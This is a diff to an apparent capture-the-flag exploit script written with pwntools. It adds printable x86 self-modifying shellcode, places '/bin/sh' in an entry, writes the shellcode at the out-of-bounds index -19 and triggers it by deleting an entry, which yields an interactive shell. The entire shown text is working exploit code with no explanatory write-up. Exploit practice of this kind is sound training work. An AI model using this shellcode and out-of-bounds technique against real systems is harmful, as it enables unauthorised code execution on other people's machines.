@@ -5,7 +5,7 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.log_level = "debug"
+#  context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
@@ -37,9 +37,39 @@ def delName(idx):
     io.sendlineafter("Index :", str(idx))
 
 if __name__ == "__main__":
+    sc = asm(
+            '''
+            pop ebp;
+            pop ebx;
+            push 0x7e;
+            pop eax;
+            inc eax;
+            inc eax;
+            xor [ebx+0x2a],eax;
+            xor [ebx+0x2b],eax;
+            push ecx;
+            pop eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            inc eax;
+            '''
+            )
+    sc += 'M'
+    #  sc = '][j~X@@1C*1C+QX@@@@@@@@@@@M'
+    success("len(sc) -> {}".format(len(sc)))
+    success("sc -> {}".format(sc))
+    addName(0, "/bin/sh\x00")
+    addName(-19, sc)
+    #  DEBUG()
+    delName(0)
 
-
-
-
-
-
+    io.interactive()
+    io.close()
